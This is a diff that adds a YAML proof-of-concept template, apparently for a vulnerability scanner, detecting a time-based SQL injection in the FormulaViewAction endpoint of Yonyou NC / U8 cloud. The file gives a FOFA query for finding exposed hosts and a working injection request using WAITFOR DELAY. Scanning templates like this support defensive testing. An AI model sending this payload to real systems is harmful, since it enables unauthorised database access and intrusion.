@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-nc-formulaviewaction-sqli
+info:
+  name: 用友NC FormulaViewAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1%27)%20WAITFOR%20DELAY%20%270:0:{{.t1}}%27--+&unitID=public
+  expression: 'status_code == 200 &&
+
+    contains(body,"iUFO") &&
+
+    contains(body,"操作失败") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
